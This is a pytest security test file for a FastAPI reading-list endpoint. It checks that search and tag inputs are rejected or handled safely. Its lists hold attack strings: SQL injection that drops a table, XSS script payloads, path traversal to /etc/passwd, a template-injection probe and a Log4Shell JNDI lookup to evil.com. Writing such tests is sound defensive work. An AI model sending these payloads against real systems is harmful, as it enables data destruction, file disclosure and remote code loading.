from fastapi.testclient import TestClient


def test_sql_injection_in_search_query(client: TestClient):
    payload = {
        "title": "Test Book",
        "tags": ["test"],
        "priority": 3,
    }
    client.post("/reading-list", json=payload)

    sql_injection_attempts = [
        "'; DROP TABLE reading_items; --",
        "1' OR '1'='1",
        "admin'--",
        "1' UNION SELECT * FROM reading_items--",
        "' OR 1=1--",
    ]

    for attack in sql_injection_attempts:
        response = client.get("/reading-list", params={"q": attack})
        assert response.status_code in [200, 422]
        if response.status_code == 200:
            assert isinstance(response.json(), list)


def test_xss_in_title(client: TestClient):
    xss_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
    ]

    for xss in xss_payloads:
        payload = {
            "title": xss,
            "tags": ["test"],
            "priority": 3,
        }
        response = client.post("/reading-list", json=payload)
        if response.status_code == 201:
            item = response.json()
            assert xss not in item["title"] or item["title"] != xss


def test_long_string_attack(client: TestClient):
    long_string = "A" * 10000

    response = client.get("/reading-list", params={"q": long_string})
    assert response.status_code == 422

    response = client.get("/reading-list", params={"tag": long_string})
    assert response.status_code == 422


def test_invalid_characters_in_search(client: TestClient):
    invalid_queries = [
        "../../etc/passwd",
        "file:///etc/passwd",
        "<?xml version='1.0'?>",
        "${jndi:ldap://evil.com/a}",
        "{{7*7}}",
    ]

    for invalid_query in invalid_queries:
        response = client.get("/reading-list", params={"q": invalid_query})
        assert response.status_code == 422


def test_boundary_values(client: TestClient):
    max_length_query = "A" * 100
    response = client.get("/reading-list", params={"q": max_length_query})
    assert response.status_code in [200, 422]

    over_max_query = "A" * 101
    response = client.get("/reading-list", params={"q": over_max_query})
    assert response.status_code == 422

    max_length_tag = "A" * 24
    response = client.get("/reading-list", params={"tag": max_length_tag})
    assert response.status_code in [200, 422]

    over_max_tag = "A" * 25
    response = client.get("/reading-list", params={"tag": over_max_tag})
    assert response.status_code == 422


def test_special_characters_in_tag(client: TestClient):
    invalid_tags = [
        "tag with spaces",
        "tag<script>",
        "tag' OR '1'='1",
        "../../tag",
        "tag; DROP TABLE",
    ]

    for invalid_tag in invalid_tags:
        response = client.get("/reading-list", params={"tag": invalid_tag})
        assert response.status_code == 422


def test_empty_and_whitespace_inputs(client: TestClient):
    response = client.get("/reading-list", params={"q": ""})
    assert response.status_code in [200, 422]

    response = client.get("/reading-list", params={"q": "   "})
    assert response.status_code in [200, 422]

    response = client.get("/reading-list", params={"tag": ""})
    assert response.status_code in [200, 422]


def test_negative_priority(client: TestClient):
    payload = {
        "title": "Test",
        "priority": -1,
    }
    response = client.post("/reading-list", json=payload)
    assert response.status_code == 422

    payload = {
        "title": "Test",
        "priority": 0,
    }
    response = client.post("/reading-list", json=payload)
    assert response.status_code == 422


def test_priority_above_max(client: TestClient):
    payload = {
        "title": "Test",
        "priority": 6,
    }
    response = client.post("/reading-list", json=payload)
    assert response.status_code == 422


def test_empty_title(client: TestClient):
    payload = {
        "title": "",
        "tags": ["test"],
    }
    response = client.post("/reading-list", json=payload)
    assert response.status_code == 422


def test_title_too_long(client: TestClient):
    payload = {
        "title": "A" * 121,
        "tags": ["test"],
    }
    response = client.post("/reading-list", json=payload)
    assert response.status_code == 422
